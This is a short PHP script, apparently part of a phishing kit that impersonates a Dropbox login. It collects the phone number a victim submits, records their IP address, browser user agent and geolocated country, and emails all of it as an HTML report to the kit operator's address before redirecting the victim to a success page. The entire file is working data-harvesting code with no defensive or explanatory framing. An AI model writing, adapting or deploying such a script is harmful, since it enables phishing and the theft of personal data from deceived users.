<?php
session_start();
include "to.php";
$xsam = getenv("REMOTE_ADDR");
$xadoo = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$xsam");
$COUNTRY = $xadoo->geoplugin_countryName ;  
$ip = getenv("REMOTE_ADDR");
$PHN	=	$_POST["phone"];
$browser             =   $_SERVER['HTTP_USER_AGENT'];

$Message =	"<b><font color='#3b3f40' size='4.5px'>-----------{ <font color='#f6546a'>NUMBER</font> }-----------</b><br>";
$Message .=	"<b>Phone number : </b><font color='#0097ff'>".$PHN."</font><br>";
$Message .=	"<b>-----------{ <font color='#f6546a'><b>INFOS</b></font>}-----------</b><br>";
$Message .=	"<b>IP Address : </b><a href='http://www.whoer.net/?IP=".$ip."'><font color='#c5405b'>".$ip."</font></a><br>";
$Message .=	"<b>User Agent  : </b><font color='#c5405b'>".$browser."</font><br>";
$Message .=	"<b>-----------{ <font color='#f6546a'><b>DROP-BOX</b></font> }-----------</b></font><br>";

$Subject = "[DROPBOX] ~ Login ~ From ~ [$ip] Country [$COUNTRY]";

$Headers = "From: DRBX01\r\n";
$Headers .= "MIME-Version: 1.0\r\n";
$Headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

mail($to,$Subject,$Message,$Headers);

header("location: success.php");

 
?>